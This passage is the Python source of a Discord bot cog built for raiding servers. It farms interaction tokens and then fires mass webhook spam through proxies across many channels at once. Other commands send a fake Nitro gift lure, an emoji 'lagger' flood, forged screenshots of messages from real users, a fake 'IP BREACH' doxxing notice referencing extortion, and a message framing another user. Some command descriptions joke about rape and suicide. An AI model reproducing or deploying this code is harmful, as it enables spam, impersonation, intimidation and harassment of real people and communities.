        await interaction.edit_original_response(
            embed=discord.Embed(
                title="turtle mode",
                description=f"**{landed}/{len(jobs)}**",
                color=0x57f287 if landed else 0xed4245),
            view=None)

    # ── farm / all-raid (proxy firing) ──────────────────────

    def _farm_embed(self):
        farmed = len(self.farm_tokens) * FARM_PER_PRESS
        return discord.Embed(
            title="cookie sim",
            description=(
                f"**Farmed: {farmed}/{FARM_CAP} messages**\n\n"
                "Press **+5** to stack interaction tokens.\n"
                "Press **Raid** to fire everything."
            ),
            color=0x2b2d31,
        )

    def _farm_view(self):
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(
            label="+5", style=discord.ButtonStyle.primary, custom_id="farm"))
        view.add_item(discord.ui.Button(
            label="Raid", style=discord.ButtonStyle.danger,
            custom_id="raid_fire"))
        return view

    def _all_raid_key(self, interaction):
        return f"{interaction.guild_id}:{interaction.user.id}"

    def _all_raid_embed(self, key):
        tokens = self.all_raid_tokens.get(key, [])
        farmed = len(tokens) * FARM_PER_PRESS
        chan_count = len({cid for _, cid in tokens})
        by_channel = {}
        for _, cid in tokens:
            by_channel[cid] = by_channel.get(cid, 0) + 1
        lines = [f"<#{cid}> : {n * FARM_PER_PRESS} msgs"
                 for cid, n in by_channel.items()]
        return discord.Embed(
            title="nuke em all",
            description=(
                f"**Farmed: {farmed} messages ({chan_count} channel(s))**\n\n"
                + ("\n".join(lines) + "\n\n" if lines else "")
                + "Press **+5** in EVERY channel you want to raid.\n"
                "Press **Execute** to raid all channels at once."
            ),
            color=0x2b2d31,
        )

    def _all_raid_view(self):
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(
            label="+5", style=discord.ButtonStyle.primary,
            custom_id="farm_all"))
        view.add_item(discord.ui.Button(
            label="Execute", style=discord.ButtonStyle.danger,
            custom_id="execute_all"))
        view.add_item(discord.ui.Button(
            label="Guide", style=discord.ButtonStyle.secondary,
            custom_id="guide_all"))
        return view

    @app_commands.command(
        name="raid-farm",
        description="clicker sim - farm tokens then fire everything",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def raid_farm(self, interaction: discord.Interaction):
        self._bump("raid-farm", interaction)
        await interaction.response.send_message(
            embed=self._farm_embed(), view=self._farm_view(),
            ephemeral=True)

    @app_commands.command(
        name="all-raid",
        description="farm in every channel then nuke em all at once",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def all_raid(self, interaction: discord.Interaction):
        self._bump("all-raid", interaction)
        key = self._all_raid_key(interaction)
        self.all_raid_tokens.setdefault(key, self._load_all_raid_tokens(key))
        await interaction.response.send_message(
            embed=self._all_raid_embed(key), view=self._all_raid_view(),
            ephemeral=True)

    async def _fire_farm(self, interaction):
        message = self.bot.raid_message
        tokens = list(self.farm_tokens)
        self.farm_tokens = []

        if not tokens:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    description="No tokens farmed yet. Press **+5** first.",
                    color=0xed4245),
                view=None)
            return

        jobs = []
        for token in tokens:
            url = _WEBHOOK.format(
                app=interaction.application_id, token=token)
            payload = {"content": message, "allowed_mentions": raids.MENTIONS}
            jobs.extend((url, payload) for _ in range(FARM_PER_PRESS))

        async def _fire(url, payload):
            return await proxy.webhook_post(
                url, payload, wait=False, pool=self.farm_pool,
                pace=self.farm_delay)

        def _ok(r):
            return (isinstance(r, dict) and r.get("id")) or r is True

        results = await asyncio.gather(
            *(_fire(u, p) for u, p in jobs),
            return_exceptions=True)
        landed = sum(1 for r in results if _ok(r))

        await interaction.edit_original_response(
            embed=discord.Embed(
                title="cookie sim",
                description=f"**{landed} sent**",
                color=0x2b2d31),
            view=None)

    async def _fire_all_raid(self, interaction, key):
        message = self.bot.raid_message
        tokens = list(self.all_raid_tokens.get(key, []))
        self.all_raid_tokens[key] = []
        self._save_all_raid_tokens(key, [])

        if not tokens:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    description="No tokens farmed yet. Press **+5** first.",
                    color=0xed4245),
                view=None)
            return

        # group by channel
        by_channel = {}
        for token, cid in tokens:
            by_channel.setdefault(cid, []).append(token)

        async def _fire(url, payload):
            return await proxy.webhook_post(
                url, payload, wait=False, pool=self.farm_pool,
                pace=self.farm_delay)

        def _ok(r):
            return (isinstance(r, dict) and r.get("id")) or r is True

        # round robin channels
        per_chan = []
        for cid, toks in by_channel.items():
            lst = []
            for token in toks:
                url = _WEBHOOK.format(
                    app=interaction.application_id, token=token)
                payload = {"content": message,
                           "allowed_mentions": raids.MENTIONS}
                for _ in range(FARM_PER_PRESS):
                    lst.append((url, payload))
            if lst:
                per_chan.append(lst)

        # every channel at once - all jobs fire concurrently
        results = await asyncio.gather(
            *(_fire(u, p) for lst in per_chan for u, p in lst),
            return_exceptions=True)
        landed = sum(1 for r in results if _ok(r))

        # per-channel report
        chan_report = [f"<#{cid}>: {len(toks) * FARM_PER_PRESS} fired"
                       for cid, toks in by_channel.items()]
        await interaction.edit_original_response(
            embed=discord.Embed(
                title="nuke em all",
                description=(f"**{landed} sent**\n" + "\n".join(chan_report)),
                color=0x2b2d31),
            view=None)

    # ── novelty raids ───────────────────────────────────────

    class _RedeemView(discord.ui.View):
        def __init__(self, cog):
            super().__init__(timeout=None)
            self.cog = cog

        @discord.ui.button(
            label="Redeem!",
            style=discord.ButtonStyle.success,
            custom_id="fake_nitro_redeem",
        )
        async def on_redeem(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
            await interaction.response.defer(ephemeral=True)
            button.disabled = True
            try:
                await interaction.message.edit(view=self)
            except Exception:
                pass
            message = raids.raid_payload(
                self.cog.bot.raid_message or "raid")
            payload = {"content": message, "username": "anon",
                       "allowed_mentions": raids.MENTIONS}
            await self.cog._fire_raw(interaction, payload, times=5)
            await self.cog._followup_ephemeral(interaction, message)

    @app_commands.command(
        name="fake-nitro",
        description="gift a fake nitro and rape someone",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def fake_nitro(self, interaction: discord.Interaction,
                         user: discord.Member = None):
        self._bump("fake-nitro", interaction)
        name = user.mention if user else interaction.user.mention
        nitro_url = (
            "https://www.donanimarsivi.com/wp-content/uploads/2022/05/"
            "EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-"
            "944994658df3b04d0c4940be832da19e.png")
        data = {
            "flags": 32768,
            "components": [
                {
                    "type": 17,
                    "components": [
                        {
                            "type": 12,
                            "items": [
                                {
                                    "media": {
                                        "url": nitro_url,
                                    }
                                }
                            ]
                        },
                        {
                            "type": 10,
                            "content": (
                                f"# You've been gifted a subscription!\n"
                                f"{name} has gifted you nitro for 1 months!"),
                        },
                        {
                            "type": 1,
                            "components": [
                                {
                                    "type": 2,
                                    "style": 3,
                                    "label": "Redeem!",
                                    "custom_id": "fake_nitro_redeem",
                                }
                            ]
                        }
                    ]
                }
            ]
        }
        await self._ack(interaction)
        await raids.raw_followup(interaction, data)

    @app_commands.command(
        name="rickroll-spam",
        description="yea ts doesnt work",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def rickroll_spam(self, interaction: discord.Interaction):
        self._bump("rickroll-spam", interaction)
        giphy_uris = (
            "https://static2.klipy.com/ii/c3a19a0b747a76e98651f2b9a3cca5ff/3e/62/qr7c3zGt.gif",
            "https://cdn.discordapp.com/attachments/1535371088240844800/1540600739951542282/tasuaast.gif?ex=6a8a8bbf&is=6a893a3f&hm=071bf1ea6fc801ffd2748aaf8fb9a6c132692ff08bf67de0844a38115754f70f&",
            "https://cdn.discordapp.com/attachments/1535371088240844800/1540600422731882556/zlLmOunU.gif?ex=6a8a8b73&is=6a8939f3&hm=8f790a596196f3c6b1ed80a42723d8fb6c1a558d06b817267b9b8353a1a3239e&",
            "https://cdn.discordapp.com/attachments/1535371088240844800/1540600609873461268/asdedasf.gif?ex=6a8a8ba0&is=6a893a20&hm=666b2120603465b6c9bae48a754a46d9dd5db485c1893d2e8f7f6e03aeaa0464&",
        )
        raid_msg = self.bot.raid_message
        await self._ack(interaction)
        content = " ".join(list(giphy_uris) + [raid_msg])
        landed = await self._fire_raw(
            interaction,
            {"content": content, "username": "anon",
             "allowed_mentions": raids.MENTIONS},
            times=5)
        await self._followup_ephemeral(
            interaction, "rickrolled" if landed else "rickroll failed")

    @app_commands.command(
        name="blind-raid",
        description="flashbang",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def blind_raid(self, interaction: discord.Interaction):
        self._bump("blind-raid", interaction)
        await self._ack(interaction)
        landed = await self._fire_raw(
            interaction,
            {"content": self._blind_content(),
             "username": "anon",
             "allowed_mentions": raids.MENTIONS},
            times=5)
        await self._followup_ephemeral(
            interaction, "blinded" if landed else "flashbang failed")

    @app_commands.command(
        name="lagger",
        description="crash the chat and make owner commit a suicide!",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def lagger(self, interaction: discord.Interaction):
        self._bump("lagger", interaction)
        await self._ack(interaction, "sent.")
        for _ in range(5):
            try:
                emojis = "".join(random.choices(_CRASHER_EMOJIS, k=1999))
                await raids.fire_followup(interaction, emojis)
            except Exception:
                pass

    # ── fake-message ────────────────────────────────────────

    @app_commands.command(
        name="fake-message",
        description="fake a message from someone else",
    )
    @app_commands.describe(
        user1="first user", usermsg1="first message",
        user2="second user (optional)", usermsg2="second message (optional)",
        user3="third user (optional)", usermsg3="third message (optional)",
        user4="fourth user (optional)", usermsg4="fourth message (optional)",
        user5="fifth user (optional)", usermsg5="fifth message (optional)",
    )
    @app_commands.default_permissions(administrator=True)
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def fake_message(self, interaction: discord.Interaction,
                           user1: discord.User, usermsg1: str,
                           user2: discord.User = None,
                           usermsg2: str = None,
                           user3: discord.User = None,
                           usermsg3: str = None,
                           user4: discord.User = None,
                           usermsg4: str = None,
                           user5: discord.User = None,
                           usermsg5: str = None):
        self._bump("fake-message", interaction)
        pairs = [(user1, usermsg1)]
        for u, m in ((user2, usermsg2), (user3, usermsg3),
                     (user4, usermsg4), (user5, usermsg5)):
            if u is not None and m:
                pairs.append((u, m))
        await interaction.response.defer(ephemeral=True)
        try:
            file = await self._render_fake_message(interaction, pairs)
            await interaction.followup.send(file=file, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(
                f"fake message failed: {e}", ephemeral=True)

    async def _render_fake_message(self, interaction, pairs):
        from PIL import Image, ImageDraw

        guild = interaction.guild
        # resolve display names + server tag per user. The clan tag is
        # USER-level data - GET /users/{id} returns it even in DMs where
        # there is no guild member record to read.
        entries = []
        for u, msg in pairs:
            name = u.display_name
            tag = None
            badge_url = None
            raw_user = None
            if guild:
                raw = None
                try:
                    raw = await self.bot.http.get_guild_member(guild.id, u.id)
                except Exception:
                    raw = None
                if raw:
                    name = (raw.get("nick")
                            or raw.get("user", {}).get("global_name")
                            or u.display_name)
                    raw_user = raw.get("user") or {}
            if raw_user is None:
                # DM context or member fetch failed - user-level fetch
                try:
                    raw_user = await self.bot.http.get_user(u.id)
                except Exception:
                    raw_user = None
                if raw_user and raw_user.get("global_name"):
                    name = raw_user["global_name"]
            if raw_user:
                clan = raw_user.get("clan") or raw_user.get("primary_guild") or {}
                tag = clan.get("tag")
                if clan.get("identity_enabled") is False:
                    tag = None
                badge_hash = clan.get("badge")
                igid = clan.get("identity_guild_id")
                if tag and badge_hash and igid:
                    badge_url = (
                        f"https://cdn.discordapp.com/"
                        f"clan-badges/{igid}/{badge_hash}.png?size=64")
            av_url = u.display_avatar.replace(size=128, format="png").url
            av_bytes = await _download_bytes(av_url)
            badge_bytes = await _download_bytes(badge_url) if badge_url else None
            entries.append({"user_id": u.id, "bot": u.bot, "name": name,
                            "tag": tag, "badge": badge_bytes, "msg": msg[:500],
                            "av": av_bytes})

        # Discord-accurate metrics, 2x supersampled for crispness.
        # dark theme: bg #000, avatar 40px, content 16px/22px, name 16px
        # semibold, timestamp 12px, emoji 22px.
        S = 2
        W = 760 * S
        PAD_L = 16 * S
        AV = 40 * S
        GAP = 16 * S
        TEXT_X = PAD_L + AV + GAP
        PAD_R = 48 * S
        MAX_W = W - TEXT_X - PAD_R
        NAME_SIZE = 16 * S
        TEXT_SIZE = 16 * S
        TIME_SIZE = 12 * S
        TAG_SIZE = 12 * S
        BOT_SIZE = 10 * S
        LINE_H = 22 * S
        EMOJI_SIZE = 22 * S
        NAME_LH = 22 * S
        TOP_PAD = 2 * S
        BOT_PAD = 2 * S
        TAG_OFF = 2 * S

        name_font = _load_font(_WHITNEY_SEMIBOLD, _DEJAVU_BOLD, NAME_SIZE)
        text_font = _load_font(_WHITNEY, _DEJAVU, TEXT_SIZE)
        time_font = _load_font(_WHITNEY, _DEJAVU, TIME_SIZE)
        tag_font = _load_font(_WHITNEY_SEMIBOLD, _DEJAVU_BOLD, TAG_SIZE)
        bot_font = _load_font(_WHITNEY_BOLD, _DEJAVU_BOLD, BOT_SIZE)

        probe = Image.new("RGB", (10, 10))
        probe_draw = ImageDraw.Draw(probe)
        mixed = _MixedText(probe_draw)

        # mention names for @highlighting (longest first)
        mention_names = sorted({e["name"] for e in entries},
                               key=len, reverse=True)

        # layout: wrap each paragraph, group consecutive same-author msgs
        blocks = []
        for e in entries:
            lines = []
            for para in e["msg"].split("\n"):
                lines.extend(_wrap_mixed(mixed, para, text_font, TEXT_SIZE,
                                         MAX_W))
            if not lines:
                lines = [""]
            blocks.append({"e": e, "lines": lines})

        prev_uid = None
        total_h = 0
        for b in blocks:
            b["compact"] = b["e"]["user_id"] == prev_uid
            prev_uid = b["e"]["user_id"]
            content_h = len(b["lines"]) * LINE_H
            if b["compact"]:
                b["h"] = TOP_PAD + content_h + BOT_PAD
            else:
                # avatar is centered on the content start, so its bottom is
                # at (AV+NAME_LH)//2 + AV//2; content bottom is at
                # (AV+NAME_LH)//2 + content_h - take the larger
                b["h"] = (TOP_PAD
                          + (AV + NAME_LH) // 2
                          + max(AV // 2, content_h)
                          + BOT_PAD)
            total_h += b["h"]

        canvas = Image.new("RGB", (W, total_h), _FAKE_BG)
        draw = ImageDraw.Draw(canvas)

        y = TOP_PAD
        stamp = _discord_timestamp()
        text_off = (LINE_H - TEXT_SIZE) // 2
        for b in blocks:
            e = b["e"]
            if b["compact"]:
                # grouped message, no avatar/name row
                ty = y + TOP_PAD
                for line in b["lines"]:
                    mixed.render_runs(
                        (TEXT_X, ty + text_off),
                        _mention_runs(line, mention_names),
                        text_font, TEXT_SIZE, canvas, EMOJI_SIZE)
                    ty += LINE_H
            else:
                ny = y + TOP_PAD + (AV - NAME_LH) // 2
                av_top = ny + NAME_LH - AV // 2
                if e["av"]:
                    av = _circle_avatar(e["av"], AV)
                    canvas.paste(av, (PAD_L, av_top), av)
                else:
                    draw.ellipse((PAD_L, av_top,
                                  PAD_L + AV,
                                  av_top + AV),
                                 fill=_FAKE_AV_FALLBACK)
                    initial = (e["name"][:1] or "?").upper()
                    iw = mixed.width(initial, name_font, NAME_SIZE)
                    draw.text((PAD_L + (AV - iw) // 2,
                               av_top + (AV - NAME_SIZE) // 2 - 2 * S),
                              initial, font=name_font, fill=(255, 255, 255))
                nx = TEXT_X
                name_txt = e["name"]
                if mixed.width(name_txt, name_font, NAME_SIZE) > MAX_W * 0.55:
                    while (name_txt and mixed.width(
                            name_txt + "…", name_font, NAME_SIZE)
                            > MAX_W * 0.55):
                        name_txt = name_txt[:-1]
                    name_txt += "…"
                nx = mixed.render((nx, ny + (NAME_LH - NAME_SIZE) // 2),
                                  name_txt, name_font, NAME_SIZE,
                                  _FAKE_NAME, canvas, NAME_SIZE)
                nx += 8 * S
                # bot badge
                if e["bot"]:
                    bw = mixed.width("BOT", bot_font, BOT_SIZE) + 8 * S
                    bh = 15 * S
                    draw.rounded_rectangle(
                        (nx, ny + 3 * S, nx + bw, ny + 3 * S + bh),
                        radius=3 * S, fill=_FAKE_BOT_BG)
                    draw.text((nx + 4 * S, ny + 4 * S), "BOT",
                              font=bot_font, fill=(255, 255, 255))
                    nx += bw + 8 * S
                # clan tag chip
                if e["tag"]:
                    tag_txt = str(e["tag"])[:12]
                    tw = mixed.width(tag_txt, tag_font, TAG_SIZE)
                    icon_sz = 16 * S
                    chip_h = 20 * S
                    left_pad = 4 * S
                    right_pad = 6 * S
                    gap = 4 * S
                    chip_w = (left_pad
                              + (icon_sz + gap if e["badge"] else 0)
                              + tw + right_pad)
                    cy = ny + (NAME_LH - chip_h) // 2 + TAG_OFF
                    draw.rounded_rectangle(
                        (nx, cy, nx + chip_w, cy + chip_h),
                        radius=4 * S, fill=_FAKE_TAG_BG)
                    ix = nx + left_pad
                    if e["badge"]:
                        try:
                            badge = Image.open(
                                io.BytesIO(e["badge"])).convert("RGBA")
                            badge = badge.resize((icon_sz, icon_sz),
                                                 Image.LANCZOS)
                            canvas.paste(badge, (int(ix), int(cy + 2 * S)),
                                         badge)
                        except Exception:
                            pass
                        ix += icon_sz + gap
                    mixed.render((ix, cy + 4 * S), tag_txt, tag_font,
                                 TAG_SIZE, (255, 255, 255), canvas, TAG_SIZE)
                    nx += chip_w + 8 * S
                # timestamp
                draw.text((nx, ny + 5 * S), stamp, font=time_font,
                          fill=_FAKE_TIME)
                # message text
                ty = ny + NAME_LH
                for line in b["lines"]:
                    mixed.render_runs(
                        (TEXT_X, ty + text_off),
                        _mention_runs(line, mention_names),
                        text_font, TEXT_SIZE, canvas, EMOJI_SIZE)
                    ty += LINE_H
            y += b["h"]

        out = io.BytesIO()
        canvas.save(out, format="PNG")
        out.seek(0)
        return discord.File(out, filename="fake_message.png")

    # ── misc attacks ────────────────────────────────────────

    @app_commands.command(
        name="blame",
        description="blame sm1 and act like a victim",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def blame(self, interaction: discord.Interaction, user: discord.User):
        self._bump("blame", interaction)
        await self._ack(interaction)
        content = (f"# Thanks!\n\n"
                   f"## thanks {user.mention}\n\n"
                   f"your `/raid` has been completed successfully!. \n"
                   f"please dont forget to drop a vouch!")
        data = {
            "flags": 32768,
            "components": [
                {"type": 17, "components": [{"type": 10, "content": content}]}
            ],
        }
        await raids.raw_followup(interaction, data)

    @app_commands.command(
        name="fake-ip",
        description="BOIII 764 BOOIII EXTORTION BOOII",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def fake_ip(self, interaction: discord.Interaction, user: discord.User):
        self._bump("fake-ip", interaction)
        await self._ack(interaction)
        ip = _fake_ip()
        content = (f"# IP BREACH\n\n"
                   f"## breach : `cloudflare`\n\n"
                   f"## public : `true`\n\n"
                   f"### user : {user.mention}\n\n"
                   f"### ip : `{ip}`")
        data = {
            "flags": 32768,
            "components": [
                {"type": 17, "components": [{"type": 10, "content": content}]}
            ],
        }
        await raids.raw_followup(interaction, data)

    @app_commands.command(
        name="check",
        description="check if raidable or na ong",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def check(self, interaction: discord.Interaction):
        self._bump("check", interaction)
        g = interaction.guild
        if g is None:
            embed = discord.Embed(
                title="raidable or na",
                description="**this server isn't raidable** ❌",
                color=0xed4245)
            embed.add_field(
                name="why",
                value="you are in DMs - no server here to raid, "
                      "main character in the void",
                inline=False)
            await interaction.response.send_message(embed=embed,
                                                    ephemeral=True)
            return

        # defer so it doesnt timeout
        try:
            await interaction.response.defer(ephemeral=True)
        except Exception:
            pass

        perms = getattr(interaction, "permissions", None) or \
            interaction.app_permissions
        app_allowed = bool(getattr(perms, "use_external_apps", False))
        can_post = bool(getattr(perms, "send_messages", False))
        can_mention = bool(getattr(perms, "mention_everyone", False))
        channel = interaction.channel
        slowmode = getattr(channel, "rate_limit_per_user", 0) or 0
        raidable = bool(app_allowed and can_post and slowmode < 5)

        data = {
            "flags": 32768,
            "components": [
                {
                    "type": 17,
                    "components": [
                        {
                            "type": 10,
                            "content": (
                                f"### external apps : "
                                f"{'true' if app_allowed else 'false'}"),
                        },
                        {
                            "type": 14,
                            "spacing": 2,
                            "divider": True,
                        },
                        {
                            "type": 10,
                            "content": (
                                f"### @everyone? : "
                                f"{'true' if can_mention else 'false'}"),
                        },
                        {
                            "type": 14,
                            "spacing": 2,
                            "divider": True,
                        },
                        {
                            "type": 10,
                            "content": (
                                f"### slowmode : "
                                f"{'true' if slowmode > 0 else 'false'}"),
                        },
                        {
                            "type": 10,
                            "content": (
                                f"### verdict : "
                                f"{'raidable ✅' if raidable else 'not raidable ❌'}"),
                        },
                    ],
                }
            ],
        }
        await raids.raw_followup(interaction, data)

    # ── tools ───────────────────────────────────────────────

    @app_commands.command(name="ping", description="pong")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def ping(self, interaction: discord.Interaction):
        self._bump("ping", interaction)
        ms = round(self.bot.latency * 1000)
        await interaction.response.send_message(
            f"pong - `{ms}ms`", ephemeral=True)

    @app_commands.command(name="uptime", description="how long is bot on")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def uptime(self, interaction: discord.Interaction):
        self._bump("uptime", interaction)
        up = time.time() - self._start
        h, rem = divmod(int(up), 3600)
        m, s = divmod(rem, 60)
        await interaction.response.send_message(
            f"up `{h}h {m}m {s}s`", ephemeral=True)

    @app_commands.command(name="invite", description="get a invite for our server")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def invite(self, interaction: discord.Interaction):
        self._bump("invite", interaction)
        cid = getattr(self.bot.user, "id", None) or self.bot.application_id
        link = (f"https://discord.com/oauth2/authorize?client_id={cid}"
                f"&scope=applications.commands&integration_type=1")
        await interaction.response.send_message(
            "Install to **your account**, use in any server with "
            f"External Apps enabled:\n{link}", ephemeral=True)

    @app_commands.command(name="help", description="i dare you")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def help(self, interaction: discord.Interaction):
        self._bump("help", interaction)
        groups = {}
        for cmd in self.bot.tree.get_commands():
            cog = getattr(getattr(cmd, "callback", None), "__self__", None)
            key = getattr(getattr(cog, "__class__", None), "__name__", "misc")
            groups.setdefault(key, []).append(f"`/{cmd.name}`")
        blocks = []
        for key, cmds in sorted(groups.items()):
            blocks.append(f"**{key}** ({len(cmds)})\n{' '.join(cmds)}")
        text = ("# CHUD - ALL COMMANDS\n\n"
                + "\n\n".join(blocks)
                + "\n\nhttps://discord.gg/5NpewnDman")
        await interaction.response.send_message(text, ephemeral=True)

    @app_commands.command(name="server-info", description="this doesnt work btw")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def server_info(self, interaction: discord.Interaction):
        self._bump("server-info", interaction)
        g = interaction.guild
        if g is None:
            await interaction.response.send_message(
                "no guild context - you are in DMs, "
                "main character in the void", ephemeral=True)
            return
        embed = discord.Embed(
            title=f"server dump - {g.name or '???'}",
            color=0x2b2d31)
        embed.add_field(name="members", value=g.member_count or "?")
        embed.add_field(name="channels", value=len(g.channels or ()))
        embed.add_field(name="roles", value=len(g.roles or ()))
        embed.add_field(
            name="verification",
            value=getattr(getattr(g, "verification_level", None), "value", "?"))
        embed.add_field(name="owner", value=g.owner or "?")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="whois", description="/whois who")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def whois(self, interaction: discord.Interaction, user: discord.User):
        self._bump("whois", interaction)
        embed = discord.Embed(title=f"stalking {user}", color=0x2b2d31)
        embed.add_field(name="id", value=user.id)
        embed.add_field(
            name="bot",
            value="yes - certified NPC" if user.bot
            else "no - one of the real ones")
        embed.add_field(name="created", value=user.created_at.date())
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="analytics", description="uhh are you egg or a nerd")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def analytics(self, interaction: discord.Interaction):
        self._bump("analytics", interaction)
        up = time.time() - self._start
        h, rem = divmod(int(up), 3600)
        m, s = divmod(rem, 60)
        lines = ["# ANALYTICS", "", f"uptime: {h}h {m}m {s}s",
                 f"latency: {round(self.bot.latency * 1000)}ms", ""]
        if self.stats:
            for cmd, n in sorted(self.stats.items(), key=lambda x: -x[1]):
                lines.append(f"{cmd}: {n}")
        else:
            lines.append("no commands fired yet - go touch grass")
        lines.append("")
        lines.append("kiox on top")
        await interaction.response.send_message(
            "\n".join(lines), ephemeral=True)


async def setup(bot):
    await bot.add_cog(Commands(bot))
